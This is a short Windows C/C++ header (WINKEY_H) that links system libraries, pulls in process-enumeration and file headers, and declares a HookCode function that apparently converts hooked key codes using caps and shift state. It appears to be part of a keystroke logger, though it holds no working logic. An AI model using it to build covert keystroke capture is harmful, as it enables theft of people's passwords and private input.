#ifndef WINKEY_H
#define WINKEY_H

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "User32.lib")

#pragma warning(push)
#pragma warning(disable:4668 4577)
#include <windows.h>
#include <process.h>
#include <Tlhelp32.h>
#include <iostream>
#include <psapi.h>
#include <string>
#include <time.h>
#pragma warning(pop)
#include <conio.h>
#include <fstream>


char *HookCode(DWORD code, BOOL caps, BOOL shift);

#endif

